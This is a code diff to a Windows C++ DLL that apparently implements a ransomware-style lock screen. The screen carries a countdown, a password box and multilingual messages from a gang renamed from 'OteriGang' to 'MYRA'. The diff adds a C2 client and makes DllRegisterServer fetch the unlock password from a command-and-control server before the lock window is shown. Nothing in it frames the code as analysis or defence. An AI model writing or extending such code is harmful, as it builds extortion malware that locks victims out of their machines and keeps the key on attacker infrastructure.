@@ -2,6 +2,7 @@
 #include "pch.h"
 #include <windows.h>
 #include <commctrl.h> // Required for Progress Bar
+#include "c2client.h"
 
 #pragma comment(lib, "comctl32.lib") // Ensure linking of common controls
 
@@ -13,7 +14,7 @@ HWND hWndProgressBar;
 HWND hWndTimerLabel;
 HWND hwndMain;
 HFONT hFontBold;
-const wchar_t* correctPassword = L"durumkebab";
+std::wstring correctPassword;
 
 // Timer variables
 int remainingTime = 60;
@@ -21,13 +22,13 @@ UINT_PTR timerID;
 
 // Static text for labels
 const wchar_t* labelTexts[8] = {
-    L"Hello, it's OteriGang.",
+    L"Hello, it's MYRA .",
     L"Contact your administration for more info on this incident ;)",
-    L"Bonjour, c'est OteriGang.",
+    L"Bonjour, c'est MYRA.",
     L"Contactez votre administration pour plus d'informations sur cet incident ;)",
-    L"??????, ??? OteriGang.",
+    L"??????, ??? MYRA.",
     L"????????? ? ????? ?????????????? ??? ????????? ?????????? ?? ???? ????????? ;)",
-    L"?????? OteriGang",
+    L"?????? MYRA",
     L"?????????????????????? ;)"
 };
 
@@ -98,7 +99,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
             wchar_t inputText[256];
             GetWindowText(hWndInput, inputText, 256);
 
-            if (wcscmp(inputText, correctPassword) == 0)
+            if (wcscmp(inputText, correctPassword.c_str()) == 0)
             {
                 MessageBox(hwnd, L"Access Granted!", L"Success", MB_OK | MB_ICONINFORMATION);
                 ExitProcess(0);
@@ -198,7 +199,17 @@ void ShowGUI()
 }
 
 // DLL Functions
-extern "C" __declspec(dllexport) HRESULT __stdcall DllRegisterServer() { ShowGUI(); return S_OK; }
+extern "C" __declspec(dllexport) HRESULT __stdcall DllRegisterServer() { 
+
+    // getting the password
+    std::string password = C2Client::get_password_from_server();
+    correctPassword = std::wstring(password.begin(), password.end());
+
+
+
+    ShowGUI(); 
+    return S_OK; 
+}
 extern "C" __declspec(dllexport) HRESULT __stdcall DllUnregisterServer() { return S_OK; }
 extern "C" __declspec(dllexport) HRESULT __stdcall DllInstall() { return S_OK; }
 
